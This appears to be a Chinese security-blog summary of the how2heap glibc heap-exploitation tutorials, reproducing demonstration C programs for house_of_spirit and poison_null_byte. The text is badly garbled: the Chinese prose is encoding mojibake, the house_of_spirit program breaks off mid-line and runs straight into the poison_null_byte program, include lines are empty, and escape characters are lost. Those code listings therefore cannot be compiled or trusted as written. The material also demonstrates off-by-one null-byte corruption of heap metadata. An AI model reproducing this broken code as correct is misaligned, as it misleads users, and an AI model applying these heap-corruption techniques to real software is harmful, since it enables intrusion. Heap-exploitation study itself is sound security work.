# ã€æŠ€æœ¯åˆ†äº«ã€‘how2heapæ€»ç»“-ä¸‹
##### è¯‘æ–‡å£°æ˜Ž
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« æ¥æºï¼šå®‰å…¨å®¢
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŽŸæ–‡ä¸ºå‡†ã€‚
ä½œè€…ï¼š[7o8v_](http://bobao.360.cn/member/contribute?uid=2556795459)
é¢„ä¼°ç¨¿è´¹ï¼š300RMB
æŠ•ç¨¿æ–¹å¼ï¼šå‘é€é‚®ä»¶è‡³linwei#360.cnï¼Œæˆ–ç™»é™†ç½‘é¡µç‰ˆåœ¨çº¿æŠ•ç¨¿
**0x00 å‰è¨€**
****
"how2heap"æ˜¯shellphishå›¢é˜Ÿåœ¨Githubä¸Šå¼€æºçš„ **å †æ¼æ´ž** ç³»åˆ—æ•™ç¨‹.
æˆ‘è¿™æ®µæ—¶é—´ä¸€ç›´åœ¨å­¦ä¹ å †æ¼æ´žåˆ©ç”¨æ–¹é¢çš„çŸ¥è¯†,çœ‹äº†è¿™äº›åˆ©ç”¨æŠ€å·§ä»¥åŽæ„Ÿè§‰å—ç›ŠåŒªæµ….
è¿™ç¯‡æ–‡ç« æ˜¯æˆ‘å­¦ä¹ è¿™ä¸ªç³»åˆ—æ•™ç¨‹åŽçš„æ€»ç»“,åœ¨æ­¤å’Œå¤§å®¶åˆ†äº«.æˆ‘ä¼šå°½é‡ç¿»è¯‘åŽŸç‰ˆæ•™ç¨‹çš„å†…å®¹,æ–¹ä¾¿è‹±è¯­ä¸å¤ªå¥½çš„åŒå­¦å­¦ä¹ .
ä¸è¿‡åœ¨å­¦ä¹ è¿™äº›æŠ€å·§ä¹‹å‰,å»ºè®®å¤§å®¶åŽ»çœ‹ä¸€çœ‹åŽåº­å†™çš„"Glibcå†…å­˜ç®¡ç†-Ptmalloc2æºç åˆ†æž"
åœ¨æ­¤ä¹Ÿç»™å‡ºåŽŸç‰ˆæ•™ç¨‹é“¾æŽ¥:
**è¡¥å……**
****
ä¸Šç¯‡çš„æ€»ç»“å› ä¸ºåœ¨å¾®ä¿¡å…¬ä¼—å·å‘è¿‡äº†ï¼Œæ‰€ä»¥ä¸åœ¨è¿™é‡Œå‘ï¼Œå¯ä»¥åˆ°æˆ‘çš„åšå®¢åŽ»çœ‹ã€‚åšå®¢ï¼š[reversing.win](http://reversing.win)
è¿™æ¬¡çš„ç¿»è¯‘éƒ¨åˆ†æˆ‘å†³å®šå†éšæ€§ä¸€ç‚¹ï¼Œæ¯ä¸€å¥å°½é‡ä½¿ç”¨æˆ‘è‡ªå·±çš„ç†è§£ã€‚
è€Œä¸”åŽŸæ–‡æœ‰äº›é”™è¯¯çš„åœ°æ–¹æˆ–è€…è¡¨æ„ä¸æ˜Žçš„åœ°æ–¹æˆ‘ä¼šåœ¨ç¿»è¯‘éƒ¨åˆ†ä¿®æ­£ï¼Œè¦æ˜¯åŽŸæ–‡çœ‹ä¸å¤ªæ˜Žç™½ï¼Œå¯ä»¥çœ‹æˆ‘çš„ç¿»è¯‘ã€‚
ç„¶åŽå°±æ˜¯è¾“å‡ºéƒ¨åˆ†æˆ‘å°±ä¸è´´äº†ï¼Œå¤§å®¶æƒ³è¦å­¦ä¹ çš„å°±è‡ªå·±åœ¨æœºå™¨ä¸Šè¾“å‡ºçœ‹çœ‹ã€‚ ðŸ˜›
**0x01 æµ‹è¯•çŽ¯å¢ƒ**
****
Ubuntu 16.04.3 LTS x64
GLIBC 2.23
**0x02 ç›®å½•**
****
house_of_spirit
poison_null_byte
house_of_lore
overlapping_chunks
overlapping_chunks_2
house_of_force
unsoted_bin_attack
**0x03 house_of_spirit**
****
æºç ï¼š
    #include 
    #include 
    int main()
    {
       printf("This file demonstrates the house of spirit attack.n");
       printf("Calling malloc() once so that it sets up its memory.n");
       malloc(1);
       printf("We will now overwrite a pointer to point to a fake 'fastbin' region.n");
       unsigned long long *a;
       // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
       unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
       printf("This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);
       printf("This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category ( 2*SIZE_SZ (> 16 on x64) && system_mem (
    #include 
    #include 
    #include 
    #include 
    int main()
    {
            printf("Welcome to poison null byte 2.0!n");
            printf("Tested in Ubuntu 14.04 64bit.n");
        printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.n");
        uint8_t* a;
        uint8_t* b;
        uint8_t* c;
        uint8_t* b1;
        uint8_t* b2;
        uint8_t* d;
        printf("We allocate 0x100 bytes for 'a'.n");
        a = (uint8_t*) malloc(0x100);
        printf("a: %pn", a);
        int real_a_size = malloc_usable_size(a);
        printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
            "(it may be more than 0x100 because of rounding): %#xn", real_a_size);
        /* chunk size attribute cannot have a least significant byte with a value of 0x00.
         * the least significant byte of this will be 0x10, because the size of the chunk includes
         * the amount requested plus some amount required for the metadata. */
        b = (uint8_t*) malloc(0x200);
        printf("b: %pn", b);
        c = (uint8_t*) malloc(0x100);
        printf("c: %pn", c);
        uint64_t* b_size_ptr = (uint64_t*)(b - 8);
        // added fix for size==prev_size(next_chunk) check in newer versions of glibc
        // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
        // this added check requires we are allowed to have null pointers in b (not just a c string)
        //*(size_t*)(b+0x1f0) = 0x200;
        printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
            "the check 'chunksize(P) != prev_size (next_chunk(P))'n");
        // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
        // which is the value of b.size after its first byte has been overwritten with a NULL byte
        *(size_t*)(b+0x1f0) = 0x200;
        // this technique works by overwriting the size metadata of a free chunk
        free(b);
        printf("b.size: %#lxn", *b_size_ptr);
        printf("b.size is: (0x200 + 0x10) | prev_in_usen");
        printf("We overflow 'a' with a single null byte into the metadata of 'b'n");
        a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
        printf("b.size: %#lxn", *b_size_ptr);
        uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
        printf("c.prev_size is %#lxn",*c_prev_size_ptr);
        // This malloc will result in a call to unlink on the chunk where b was.
        // The added check (commit id: 17f487b), if not properly handled as we did before,
        // will detect the heap corruption now.
        // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
        // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
        // next_chunk(P) == b-0x10+0x200 == b+0x1f0
        // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
        printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))n",
            *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
        b1 = malloc(0x100);
        printf("b1: %pn",b1);
        printf("Now we malloc 'b1'. It will be placed where 'b' was. "
            "At this point c.prev_size should have been updated, but it was not: %lxn",*c_prev_size_ptr);
        printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
            "before c.prev_size: %lxn",*(((uint64_t*)c)-4));
        printf("We malloc 'b2', our 'victim' chunk.n");
        // Typically b2 (the victim) will be a structure with valuable pointers that we want to control
        b2 = malloc(0x80);
        printf("b2: %pn",b2);
        memset(b2,'B',0x80);